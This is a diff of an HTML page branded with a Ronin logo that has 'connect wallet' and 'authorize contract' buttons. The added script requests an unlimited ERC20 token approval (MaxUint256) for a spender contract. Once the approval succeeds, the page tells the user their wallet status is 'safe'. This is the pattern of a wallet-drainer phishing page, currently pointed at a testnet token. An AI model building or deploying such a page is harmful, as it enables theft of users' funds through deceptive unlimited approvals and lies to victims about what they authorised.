@@ -60,12 +60,13 @@
       margin-top: 30px;
       color: #4fd1c5;
       font-weight: bold;
+      line-height: 1.6;
     }
   </style>
 </head>
 <body>
 
-  <!-- 使用你上传的本地图片 -->
+  <!-- Logo 图片（上传至 GitHub 的 raw 图地址） -->
   <img class="logo" src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE_20250403114421.png" alt="Ronin Logo" />
 
   <!-- 页面标题 -->
@@ -76,15 +77,28 @@
   <button class="btn connect-btn" onclick="connectWallet()">🔌 连接钱包</button>
   <button class="btn approve-btn" onclick="approveContract()">✅ 授权合约</button>
 
-  <!-- 钱包地址展示 -->
+  <!-- 钱包地址展示区 -->
   <div id="wallet-address"></div>
 
-  <!-- 引入 ethers.js -->
+  <!-- 引入 ethers.js + 主脚本逻辑 -->
   <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
   <script>
     let userAddress;
-    const contractAddress = "0xfdB563c33AB7F14e411d58651959318597D8CC1E"; // 你的代理合约地址
-    const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // 你的 ERC20 Token 地址
+    const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // Sepolia 测试网 USDC
+    const spenderAddress = "0x572A3a205247F867fE636Cf81Ff0e8C2DC7Ba553"; // 你部署的合约地址
+
+    const erc20ABI = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
 
     async function connectWallet() {
       if (window.ethereum) {
@@ -107,4 +121,20 @@
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer =
+      const signer = provider.getSigner();
+      const token = new ethers.Contract(tokenAddress, erc20ABI, signer);
+
+      try {
+        const tx = await token.approve(spenderAddress, ethers.constants.MaxUint256);
+        await tx.wait();
+
+        document.getElementById("wallet-address").innerHTML =
+          `钱包地址：${userAddress}<br/><span style="color:lightgreen;">✅ 钱包状态：安全</span>`;
+      } catch (err) {
+        document.getElementById("wallet-address").innerHTML =
+          `钱包地址：${userAddress}<br/><span style="color:orange;">⚠️ 钱包状态：未授权</span><br/>错误信息：${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
